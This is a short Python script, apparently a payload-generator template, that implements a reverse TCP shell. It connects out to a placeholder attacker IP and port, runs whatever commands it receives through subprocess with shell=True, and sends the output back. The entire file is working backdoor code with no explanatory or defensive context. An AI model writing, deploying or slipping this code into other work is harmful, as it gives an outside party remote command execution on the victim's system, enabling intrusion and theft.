import socket
import subprocess

ip = 'command_reverse_tcp_ip'
port = command_reverse_tcp_port

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.connect((ip,port))


while True:
    response = server.recv(1024)
    
    try:
        output = subprocess.check_output(response.decode(),stderr=subprocess.STDOUT,shell=True)
    except:
        output = b'[*] Failed to execute command\r\n'
    
    server.send(output[:4096])
